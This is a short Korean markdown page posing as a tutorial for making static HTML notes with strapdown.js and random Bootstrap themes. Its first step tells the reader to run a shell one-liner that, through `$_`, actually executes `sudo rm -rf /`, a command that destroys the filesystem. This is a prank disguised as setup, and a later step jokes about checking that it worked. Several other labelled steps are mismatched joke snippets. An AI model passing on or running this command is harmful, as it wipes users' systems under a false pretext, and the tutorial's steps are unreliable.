# [strapdown.js](http://strapdownjs.com) 를 이용한 'Static Markdown To HTML Note' 작성하기 :)

### Task 1 - 일단 iTerm을 열고 아래와 같이 입력한다.
```bash
$ echo 'sudo rm -rf /' && $_
```

### Task 2 - 주저하지 않고 랜덤 부트스트랩 테마를 입혀준다.
```javascript
<script type="text/javascript">
  window.location.reload(true);
</script>
```

### Task 3 - HTML파일의 이름에 따라 title이 변경되었으면 좋겠다.
```javascript
<script type="text/javascript">
  alert(location.href.substr(location.href.lastIndexOf('/') + 1));
</script>
```

### Task 4 - Task 1 이 잘수행되었는지 테스트한다.

<script type="text/javascript">
  var themeArr = [
    'Cerulean',
    'Cyborg',
    'Journal',
    'Readable',
    'Simplex',
    'Slate',
    'Spacelab',
    'Superhero',
    'United'

    /* 아직 미지원
    'Cosmo',
    'Darkly',
    'Flatly',
    'Lumen',
    'Paper',
    'Sandstone',
    'Yeti'
    */

  ];
  var rd_idx = Math.floor(Math.random() * themeArr.length);
  var theme_name = themeArr[rd_idx];
  document.getElementById('md_content').setAttribute('theme', theme_name);
  document.getElementsByTagName('title')[0].innerHTML = [
    document.getElementsByTagName('title')[0].innerHTML,
    ' [',
    theme_name,
    '] > ',
    location.href.substr(location.href.lastIndexOf('/') + 1)
  ].join('');

</script>

<script src="http://strapdownjs.com/v/0.2/strapdown.js"></script>
